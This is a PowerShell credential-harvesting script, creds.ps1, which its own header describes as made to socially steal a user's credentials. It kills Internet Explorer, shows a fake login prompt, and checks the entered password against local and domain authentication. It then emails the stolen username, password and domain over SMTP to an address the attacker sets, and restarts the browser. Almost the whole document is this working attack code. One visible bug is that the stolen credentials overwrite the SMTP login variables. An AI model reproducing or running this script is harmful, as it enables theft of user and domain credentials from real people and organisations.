########################################################################################################################
#creds.ps1
#Used to socially steal a user's credentials
#Script by: CuddlyCactusMC
#
#synopsis:
#
#When run: "creds.ps1" will wait for user to open iexplore.exe(internet explorer). Upon the execution of iexplore.exe
#the script will stop iexplore.exe and pop up a window telling the user to "Input his/her username and password to use
#Internet Explorer" it will then check the creds agianst the SAM Module, if they dont match the current user's, it will
#ask agian. Upon correct user/pass combination the script will send an email with all the creds to the specified address
#in the "config" section below. Then the script will re-launch iexplore.exe.
#config#################################################################################################################
#IMAP server address:
$serv = ""
#IMAP server port:
$servport = ""
#email account username:
$user = ""
#email account password:
$pass = ""
#your emal/the email you wish to send from:
$from = ""
#the address you want the exfil email sent to:
$to = ""
########################################################################################################################
$process = Get-Process | Where-Object {$_.ProcessName -eq "iexplore"}
while ($true){
while (!($process))
{
$process = Get-Process | Where-Object {$_.ProcessName -eq "iexplore"}
start-sleep -s 1
}
if ($process)
{
stop-process -processname iexplore -force
$process.WaitForExit()
start-sleep -s 1
$process = Get-Process | Where-Object {$_.ProcessName -eq "iexplore"}
$ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $script:pastevalue = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
                break
            }
        }
    }
$emailSmtpServer = "$serv"
$emailSmtpServerPort = "$servport"
$emailSmtpUser = "$user"
$emailSmtpPass = "$pass"
 
$emailFrom = "$from"
$emailTo = "$to"
 
$emailMessage = New-Object System.Net.Mail.MailMessage( $emailFrom , $emailTo )
$emailMessage.Subject = "Account Email"
$emailMessage.IsBodyHtml = $false
$emailMessage.Body = $pastevalue
 
$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort )
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );
 
$SMTPClient.Send( $emailMessage )
start-process iexplore
exit
}
}
